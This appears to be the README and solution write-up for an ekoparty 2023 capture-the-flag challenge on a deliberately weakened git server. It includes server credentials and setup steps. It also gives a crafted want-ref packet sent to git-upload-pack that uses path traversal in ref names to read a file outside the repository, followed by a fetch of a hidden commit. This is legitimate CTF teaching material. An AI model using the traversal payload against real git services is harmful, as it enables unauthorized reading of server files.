* Username: git
* Password: ekoparty-2023-ctf

```bash
cd home
docker build . -t ekoparty-2023-ctf
docker run --rm -it ekoparty-2023-ctf
```

# Installation on the server:

```bash
sudo adduser git
sudo adduser git docker

gcc -Wall myshell.c -o myshell

sudo emacs -nw /etc/passwd # replace /bin/bash with /home/git/myshell
```

# Challenge: git the commits

Find two flags on this server:

* IP: 40.119.46.123
* username: git
* password: ekoparty-2023-ctf

# Solution

## step 0

```
ssh git@40.119.46.123
```

Notice that this is a git-shell environment. Run the `list` command to
see the available repos. There is one called `git.git`.

## step 1

Clone the git repo:

```
git clone git@40.119.46.123:~/git.git
```

Observe that it is a copy of https://github.com/git/git.git The repo
contains an extra release tag, which you can find by comparing the
list of tags against the official version.  Alternatively, if you
first clone https://github.com/git/git.git and then add
git@40.119.46.123:~/git.git as a second remote, you'll see the extra
tag. I.e. run these commands:

```
git clone https://github.com/git/git.git
cd git/
git remote add ekoparty git@40.119.46.123:~/git.git
git fetch ekoparty --tags
```

Checkout the tag:

```
git checkout v2.34.9
```

The first flag is now checked out:

```bash
$ cat flag1.txt
EKO{af076e77-efb4-42da-a6b4-5d8cfcc3676b}
```

There is also a `Dockerfile` in the directory which shows how the
server is configured, which will help you to figure out the next step.

## step 2

From the Dockerfile found in step 1, you can figure out that there's
another git repo on the server:

```
git clone git@40.119.46.123:~/git-local
```

The Dockerfile also shows that an extra tag (`secondflag`) was added
but then removed from the git-local repo. The hash of the commit has
been stored in the file `~/flagref`. Also, the `allowanysha1inwant`
configuration has been enabled, which will let us get the content of
the commit even though the tag is gone, provided we know the commit
hash.

The source code has been modified to enable a path traversal on ref
names. Also a new upload command called "want-ref", which is normally
only available in the v2 protocol, has been added to the v0
protocol. We can use this to read `~/flagref` like this:

```
echo "001fwant-ref refs/../../flagref0000" | ssh git@40.119.46.123 "git-upload-pack '~/git.git'"
```

Which prints this error message:

```
00000049ERR upload-pack: not our ref 576d2a3b4a9ef71499faeab83ef0ad141ce44496
```

Now we can get that commit like this:

```
cd git-local
git fetch origin 576d2a3b4a9ef71499faeab83ef0ad141ce44496
git checkout 576d2a3b4a9ef71499faeab83ef0ad141ce44496
```

The second flag has been checked out:

```
$ cat flag2.txt
EKO{65e39232-2f4b-46e9-95d5-2a4fd903251b}
```
